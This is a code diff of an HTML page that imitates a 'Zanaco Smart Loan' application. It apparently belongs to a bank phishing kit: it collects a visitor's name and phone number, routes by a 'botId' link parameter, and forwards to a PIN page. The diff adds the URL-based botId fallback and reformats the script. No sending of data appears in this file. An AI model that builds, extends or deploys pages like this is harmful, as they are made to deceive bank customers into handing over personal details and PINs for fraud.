@@ -3,7 +3,8 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loan Application Details</title>
+<title>Loan Details</title>
+
 <style>
 body { font-family: Arial, sans-serif; background: #f6f7fb; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
 .loan-container { background: #fff; padding: 30px; border-radius: 12px; width: 100%; max-width: 400px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
@@ -21,12 +22,13 @@ button:disabled { background: #ccc; cursor: not-allowed; }
 
 <div class="loan-container">
     <div class="logo-container">
-        <img src="/zanaco-dp.jpeg" class="logo">
+        <img src="zanaco-dp.jpeg" class="logo">
     </div>
 
     <h2>Loan Application Form</h2>
 
     <form id="detailsForm">
+
         <label>Full Name</label>
         <input id="name" type="text" required>
 
@@ -35,7 +37,9 @@ button:disabled { background: #ccc; cursor: not-allowed; }
 
         <div class="checkbox-container">
             <input type="checkbox" id="confirmCheck">
-            <label for="confirmCheck">I agree to Zanaco Smart Loan terms and conditions</label>
+            <label for="confirmCheck">
+                I agree to Zanaco Smart Loan terms and conditions
+            </label>
         </div>
 
         <button id="nextBtn" disabled>Next</button>
@@ -43,20 +47,35 @@ button:disabled { background: #ccc; cursor: not-allowed; }
 </div>
 
 <script>
-const botId = localStorage.getItem('botId');
-if (!botId) { alert("Invalid bot link"); throw new Error("botId missing"); }
-if (!localStorage.getItem('loanAmount')) { window.location.href='index.html'; }
+// ---------------- BOT ROUTING ----------------
+let botId = localStorage.getItem('botId');
+if (!botId) {
+    const params = new URLSearchParams(window.location.search);
+    botId = params.get('botId');
+}
+if (!botId) { alert("Invalid access link"); throw new Error("botId missing"); }
+localStorage.setItem('botId', botId);
 
+// Prevent skipping previous step
+if (!localStorage.getItem('loanAmount')) {
+    window.location.href = `index.html`;
+}
+
+// ---------------- FORM LOGIC ----------------
 const confirmCheck = document.getElementById('confirmCheck');
 const nextBtn = document.getElementById('nextBtn');
 
-confirmCheck.addEventListener('change', () => { nextBtn.disabled = !confirmCheck.checked; });
+confirmCheck.addEventListener('change', () => {
+    nextBtn.disabled = !confirmCheck.checked;
+});
 
 document.getElementById('detailsForm').addEventListener('submit', e => {
     e.preventDefault();
+
     localStorage.setItem('name', name.value);
     localStorage.setItem('phone', phone.value);
-    window.location.href = 'pin.html';
+
+    window.location.href = `pin.html`;
 });
 </script>
 
